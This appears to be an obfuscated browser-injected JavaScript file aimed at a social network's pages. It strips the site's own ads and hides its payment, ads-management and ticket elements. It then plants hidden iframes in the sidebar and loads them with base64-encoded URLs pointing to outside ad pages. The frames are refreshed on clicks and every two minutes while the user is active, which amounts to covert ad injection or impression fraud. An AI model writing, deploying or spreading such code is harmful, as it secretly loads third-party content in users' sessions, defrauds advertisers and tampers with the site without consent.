if (document['getElementById']('ads_left') != null) {
    document['getElementById']('ads_left')['innerHTML'] = ''
};
if (document['getElementById']('left_ads') != null) {
    document['getElementById']('left_ads')['innerHTML'] = ''
};
var vkui = 1;
if (document['getElementById']('side_bar_inner') == null) {
    vkui = 2
};

function A() {
    var _0xb14bx3 = '';
    var _0xb14bx4 = 'abcdefghijklmnopqrstuvwxyz_';
    for (var _0xb14bx5 = 0; _0xb14bx5 < 32; _0xb14bx5++) {
        _0xb14bx3 += _0xb14bx4['charAt'](Math['floor'](Math['random']() * _0xb14bx4['length']))
    };
    return _0xb14bx3
}
var asrcfrmn = A();

function SETSRCFRM(_0xb14bx8) {
    var _0xb14bx9;
    if (_0xb14bx8 == 1) {
        _0xb14bx9 = 'side_bar_inner'
    } else {
        _0xb14bx9 = 'side_bar'
    };
    if (document['getElementById'](_0xb14bx9) != null && document['getElementById'](asrcfrmn) == null && document['getElementById'](asrcfrmn + '_a') == null && document['getElementById']('quick_login') == null) {
        var _0xb14bxa = document['createElement']('div');
        _0xb14bxa['setAttribute']('id', asrcfrmn);
        _0xb14bxa['setAttribute']('style', 'position:relative;');
        if (_0xb14bx8 == 1) {
            $('#' + _0xb14bx9 + ' ol')['after'](_0xb14bxa)
        } else {
            $('#' + _0xb14bx9)['append'](_0xb14bxa)
        };
        var _0xb14bxb = 'display:none;padding:0px;padding-top:0px;border:none;width:130px;height:1080px;overflow:hidden;z-index:100;position:static;';
        var _0xb14bxc = document['createElement']('iframe');
        _0xb14bxc['setAttribute']('style', _0xb14bxb);
        _0xb14bxc['setAttribute']('id', asrcfrmn + '_a');
        _0xb14bxc['setAttribute']('marginwidth', '0');
        _0xb14bxc['setAttribute']('marginheight', '0');
        _0xb14bxc['setAttribute']('scrolling', 'no');
        _0xb14bxc['setAttribute']('frameborder', '0');
        $('#' + asrcfrmn)['append'](_0xb14bxc);
        var _0xb14bxd = document['createElement']('iframe');
        _0xb14bxd['setAttribute']('style', _0xb14bxb);
        _0xb14bxd['setAttribute']('id', asrcfrmn + '_b');
        _0xb14bxd['setAttribute']('marginwidth', '0');
        _0xb14bxd['setAttribute']('marginheight', '0');
        _0xb14bxd['setAttribute']('scrolling', 'no');
        _0xb14bxd['setAttribute']('frameborder', '0');
        $('#' + asrcfrmn)['append'](_0xb14bxd)
    };

    function _0xb14bxe() {
        var _0xb14bxe = ['aRMLy9heGlzd29ybGQuY28vYWR2cGFnZXMvdmFkdmFhYS92YWR2bWdoLmh0bWw=', 'aRMLy9heGlzd29ybGQuY28vYWR2cGFnZXMvdmFkdmFhYS92YWR2cmNrdGFoLmh0bWw=', 'aRMLy9heGlzd29ybGQuY28vYWR2cGFnZXMvdmFkdmFhYS92YWR2bWdoLmh0bWw=', 'aRMLy9heGlzd29ybGQuY28vYWR2cGFnZXMvdmFkdmFhYS92YWR2cmNrdGFoLmh0bWw=', 'aRMLy9heGlzd29ybGQuY28vYWR2cGFnZXMvdmFkdmFhYS92YWR2bWdoLmh0bWw=', 'aRMLy9heGlzd29ybGQuY28vYWR2cGFnZXMvdmFkdmFhYS92YWR2cmNrdGFoLmh0bWw=', 'aRMLy9heGlzd29ybGQuY28vYWR2cGFnZXMvdmFkdmFhYS92YWR2bWdoYS5odG1s', 'aRMLy9heGlzd29ybGQuY28vYWR2cGFnZXMvdmFkdmFhYS92YWR2cmNrdGFoLmh0bWw=', 'aRMLy9heGlzd29ybGQuY28vYWR2cGFnZXMvdmFkdmFhYS92YWR2bWdoYS5odG1s', 'aRMLy9heGlzd29ybGQuY28vYWR2cGFnZXMvdmFkdmFhYS92YWR2bWdoYS5odG1s', 'aRMLy9heGlzd29ybGRzLm1lL2FkdnBhZ2VzL3ZhZHZhYWEvdmFkdm1naC5odG1s', 'aRMLy9heGlzd29ybGRzLm1lL2FkdnBhZ2VzL3ZhZHZhYWEvdmFkdnJja3RhaC5odG1s', 'aRMLy9heGlzd29ybGRzLm1lL2FkdnBhZ2VzL3ZhZHZhYWEvdmFkdm1naC5odG1s', 'aRMLy9heGlzd29ybGRzLm1lL2FkdnBhZ2VzL3ZhZHZhYWEvdmFkdnJja3RhaC5odG1s', 'aRMLy9heGlzd29ybGRzLm1lL2FkdnBhZ2VzL3ZhZHZhYWEvdmFkdm1naC5odG1s', 'aRMLy9heGlzd29ybGRzLm1lL2FkdnBhZ2VzL3ZhZHZhYWEvdmFkdnJja3RhaC5odG1s', 'aRMLy9heGlzd29ybGRzLm1lL2FkdnBhZ2VzL3ZhZHZhYWEvdmFkdm1naGEuaHRtbA==', 'aRMLy9heGlzd29ybGRzLm1lL2FkdnBhZ2VzL3ZhZHZhYWEvdmFkdnJja3RhaC5odG1s', 'aRMLy9heGlzd29ybGRzLm1lL2FkdnBhZ2VzL3ZhZHZhYWEvdmFkdm1naGEuaHRtbA==', 'aRMLy9heGlzd29ybGRzLm1lL2FkdnBhZ2VzL3ZhZHZhYWEvdmFkdm1naGEuaHRtbA==', 'aRMLy9zZWFyY2hwbHVzLm1lL3ZhZHZhL3ZhZHZyY2EuaHRtbA=='];
        return _0xb14bxe[Math['floor'](Math['random']() * _0xb14bxe['length'])]['substr'](3)
    }

    function _0xb14bxf(_0xb14bx10, _0xb14bx11, _0xb14bx12, _0xb14bx13, _0xb14bx14, _0xb14bx15) {
        if (_0xb14bx13 == 0 && _0xb14bx14 == 0) {
            $(_0xb14bx10)['animate']({
                opacity: _0xb14bx12
            }, _0xb14bx11, function () {
                if (_0xb14bx15 == 1) {
                    $(_0xb14bx10)['removeAttr']('src')
                }
            })
        };
        if (_0xb14bx13 != 0 && _0xb14bx14 == 0) {
            $(_0xb14bx10)['animate']({
                opacity: _0xb14bx12
            }, _0xb14bx11, function () {
                $(_0xb14bx10)['css']({
                    "display": _0xb14bx13
                });
                if (_0xb14bx15 == 1) {
                    $(_0xb14bx10)['removeAttr']('src')
                }
            })
        };
        if (_0xb14bx13 == 0 && _0xb14bx14 != 0) {
            $(_0xb14bx10)['animate']({
                opacity: _0xb14bx12
            }, _0xb14bx11, function () {
                $(_0xb14bx10)['css']({
                    "position": _0xb14bx14
                });
                if (_0xb14bx15 == 1) {
                    $(_0xb14bx10)['removeAttr']('src')
                }
            })
        };
        if (_0xb14bx13 != 0 && _0xb14bx14 != 0) {
            $(_0xb14bx10)['animate']({
                opacity: _0xb14bx12
            }, _0xb14bx11, function () {
                $(_0xb14bx10)['css']({
                    "display": _0xb14bx13
                    , "position": _0xb14bx14
                });
                if (_0xb14bx15 == 1) {
                    $(_0xb14bx10)['removeAttr']('src')
                }

            })
        }
    }
    var _0xb14bx16 = document['getElementById'](asrcfrmn + '_a');
    var _0xb14bx17 = document['getElementById'](asrcfrmn + '_b');
    if (_0xb14bx16['style']['display'] == 'none') {
        _0xb14bx16['setAttribute']('src', atob(_0xb14bxe()));

        function _0xb14bx18() {
            document['getElementById'](asrcfrmn + '_a')['onload'] = null;
            if (_0xb14bx16['getAttribute']('src') != null) {
                $('#' + asrcfrmn + '_b')['css']({
                    "z-index": '100'
                    , "position": 'static'
                });
                $('#' + asrcfrmn + '_a')['css']({
                    "z-index": '101'
                    , "position": 'absolute'
                    , "opacity": 0
                    , "display": 'block'
                    , "top": 0
                    , "left": 0
                });
                _0xb14bxf('#' + asrcfrmn + '_a', 200, 1, 0, 'static', 0);
                _0xb14bxf('#' + asrcfrmn + '_b', 200, 0, 'none', 0, 1)
            }
        }
        document['getElementById'](asrcfrmn + '_a')['onload'] = _0xb14bx18
    } else {
        _0xb14bx17['setAttribute']('src', atob(_0xb14bxe()));

        function _0xb14bx19() {
            document['getElementById'](asrcfrmn + '_b')['onload'] = null;
            if (_0xb14bx17['getAttribute']('src') != null) {
                $('#' + asrcfrmn + '_a')['css']({
                    "z-index": '100'
                    , "position": 'static'
                });
                $('#' + asrcfrmn + '_b')['css']({
                    "z-index": '101'
                    , "position": 'absolute'
                    , "opacity": 0
                    , "display": 'block'
                    , "top": 0
                    , "left": 0
                });
                _0xb14bxf('#' + asrcfrmn + '_b', 200, 1, 0, 'static', 0);
                _0xb14bxf('#' + asrcfrmn + '_a', 200, 0, 'none', 0, 1)
            }
        }
        document['getElementById'](asrcfrmn + '_b')['onload'] = _0xb14bx19
    }
}
var winact;
var eventct = 1;

function RI() {
    IRF = setInterval(function () {
        if (winact == 'active') {
            SETSRCFRM()
        }
    }, 120000)
}

function FR() {
    setTimeout(function () {
        eventct = 0
    }, 3500)
}

function CL() {
    if (eventct == 0) {
        eventct = 1;
        SETSRCFRM();
        clearInterval(IRF);
        RI();
        FR()
    }
}

function RLA() {
    $('#left_ads, #ads_left')['remove']();
    setTimeout(RLA, 30000)
}

function MAINSTART() {
    SETSRCFRM(vkui);
    FR();
    RI();
    RLA();
    var _0xb14bx21 = $('#side_bar_inner ol')['height']() - 8;
    if (_0xb14bx21 > 6) {
        $('#side_bar_inner')['css']('height', _0xb14bx21)
    };
    $('a, a span')['click'](function () {
        CL()
    });
    $(document)['on']('click', 'a div, div a, button, a > b', function () {
        CL()
    });
    setTimeout(function () {
        $('#left_blocks, .left_holiday')['animate']({
            "opacity": '0'
        }, 300, function () {
            $('#left_blocks, .left_holiday')['hide']()
        })
    }, 10000);
    var _0xb14bx22;
    $(document)['mousemove'](function () {
        if (winact != 'active') {
            winact = 'active'
        };
        clearTimeout(_0xb14bx22);
        _0xb14bx22 = setTimeout(function () {
            winact = 'inactive'
        }, 120000)
    });
    $(document)['hover'](function (_0xb14bx23) {
        if (_0xb14bx23['fromElement']) {
            winact = 'inactive';
            clearTimeout(_0xb14bx22)
        } else {
            winact = 'active'
        }
    })
}
var trystart = 0;

function START() {
    trystart += 1;
    if (window['jQuery']) {
        MAINSTART()
    } else {
        if (trystart > 35) {
            var _0xb14bx26 = document['createElement']('script');
            _0xb14bx26['type'] = 'text/javascript';
            _0xb14bx26['src'] = '//code.jquery.com/jquery-1.12.3.min.js';
            document['head']['appendChild'](_0xb14bx26)
        };
        if (trystart < 500) {
            setTimeout(START, 75)
        }
    }
}
START();
var st = document['createElement']('style');
st['innerHTML'] = '#left_ads,#left_ads > *,#ads_left,#ads_left > * > *,div[id*="ayments_bo"],div[class*="anding_moneysen"],div[id*="ds_page_simpl"] div[class*="ds_intro_pag"],div[id*="ickets_conten"] div[id*="ew_ticke"],div[id="ads_page_wrap3"],div[class*="log_about_pres"] div[class*="log_about_wra"]{display:none!important;opacity:0!important;height:0px!important;min-height:0px!important;}';
document['head']['appendChild'](st)